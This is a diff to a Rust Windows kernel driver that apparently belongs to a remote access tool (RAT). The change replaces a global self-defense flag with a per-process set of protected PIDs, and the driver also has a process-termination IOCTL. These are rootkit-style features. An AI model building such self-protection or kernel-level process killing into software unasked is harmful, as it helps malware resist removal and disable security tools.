@@ -7,8 +7,8 @@ use wdk::nt_success;
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
     IoCreateDevice, IoCreateSymbolicLink, IofCompleteRequest, ObOpenObjectByPointer,
-    ObfDereferenceObject, PsLookupProcessByProcessId, RtlInitUnicodeString, ZwClose,
-    ZwTerminateProcess,
+    ObfDereferenceObject, PsGetCurrentProcessId, PsLookupProcessByProcessId, RtlInitUnicodeString,
+    ZwClose, ZwTerminateProcess,
 };
 use wdk_sys::{
     DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
@@ -18,7 +18,7 @@ use wdk_sys::{
 };
 
 use crate::cleanup::cleanup_device;
-use crate::global::{DEVICE_NAME, DOS_NAME, RAT_DEVICE_OBJECT, SELF_DEFENSE_ACTIVATED};
+use crate::global::{DEVICE_NAME, DOS_NAME, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS};
 use crate::wrappers::bindings::IoGetCurrentIrpStackLocation;
 use crate::{error, info, warn};
 
@@ -143,9 +143,21 @@ fn device_control_notify(
 ) -> NTSTATUS {
     match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
         IOCTL_START_DEFENSE => {
-            info!("Activating self-defense");
-            SELF_DEFENSE_ACTIVATED.store(true, Ordering::Release);
-            STATUS_SUCCESS
+            let pid = unsafe { PsGetCurrentProcessId() };
+
+            match unsafe { SELF_DEFENSE_PIDS.load(Ordering::Acquire).as_ref() } {
+                Some(lock) => {
+                    info!("Activating self-defense for process {}", pid as usize);
+                    let mut set = lock.lock();
+                    set.insert(pid);
+
+                    STATUS_SUCCESS
+                }
+                None => {
+                    error!("Cannot activate self-defense for process {}", pid as usize);
+                    STATUS_UNSUCCESSFUL
+                }
+            }
         }
         IOCTL_TERMINATE => {
             let buffer = unsafe {
